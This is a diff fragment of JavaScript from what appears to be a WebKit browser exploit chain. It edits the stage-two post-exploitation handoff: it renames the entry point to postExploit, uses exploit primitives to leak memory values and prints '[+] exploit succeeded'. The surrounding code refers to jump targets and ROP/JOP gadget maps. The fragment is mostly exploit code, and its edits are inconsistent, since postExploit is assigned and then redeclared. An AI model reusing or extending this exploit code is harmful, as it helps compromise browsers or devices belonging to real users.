@@ -57,22 +57,12 @@ var get_jmptgt = function(addr) {
   return addr.add32(y + 6);
 }
 
-
-
 var reenter_help = { length:
     { valueOf: function(){
         return 0;
     }
 }};
 
-
-window.stage2 = function() {
-    try {
-        window.stage2_();
-    } catch (e) {
-        print(e);
-    }
-}
 /* For storing the gadget and import map */
 window.GadgetMap_wk = [];
 window.slowpath_jop = [];
@@ -134,7 +124,7 @@ var gadgetmap_wk = function() {
     };
 }
 var gadgets;
-window.stage2 = function() {
+postExploit = function() {
     try {
         window.stage2_();
     } catch (e) {
@@ -142,8 +132,10 @@ window.stage2 = function() {
     }
 }
 
-window.stage2_ = function() {
-    p = window.prim;
+var postExploit = function() {
+  p=window.primitives;
+
+  
     print ("[+] exploit succeeded");
     print("webkit exploit result: " + p.leakval(0x41414141));
     print ("--- welcome to stage2 ---");
